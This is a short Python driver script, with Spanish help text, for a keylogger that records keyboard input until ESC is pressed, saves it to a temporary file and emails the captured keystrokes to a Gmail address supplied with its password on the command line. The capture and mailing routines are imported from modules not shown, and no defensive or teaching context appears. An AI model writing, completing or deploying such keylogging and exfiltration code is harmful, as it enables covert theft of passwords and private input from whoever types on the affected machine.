import argparse
from MainModule.InputModule import KeyIntercept
from MainModule.EmailModule import send_content_file

parser = argparse.ArgumentParser(description="Script sencillo que captura la entrada de teclado"
                                             " del usuario, el programa se detiene cuando pulsas"
                                             " la tecla ESC,cuando el programa termina envía la "
                                             "información capturada a el correo indicado."
                                             "Debe ser de Gmail")

parser.add_argument("-e", "--email", required=True, help="Correo al que enviar la información")
parser.add_argument("-p", "--passwd", required=True, help="Contraseña del correo especificado")
parser.add_argument("-s", "--subject", default="Key Response", help="Asunto del correo")
parser.add_argument("-f", "--file-temp", default="output.txt", help="Archivo temporal")
parser.add_argument("-b", "--buffer", type=int, default=1024, help="Tamaño del arreglo en memoria")
argParser = parser.parse_args()

if __name__ == "__main__":
    # try:
    key_intercept = KeyIntercept(
        temp_file=argParser.file_temp,
        buffer_size=argParser.buffer)
    key_intercept.init_loop()
    send_content_file(
        file_name=argParser.file_temp,
        email=argParser.email,
        passwd=argParser.passwd,
        subject=argParser.subject)
# except KeyboardInterrupt:
#     print("Programa finalizado por el usuario")
# except Exception as e:
#     print("Excepción no controlada", e)
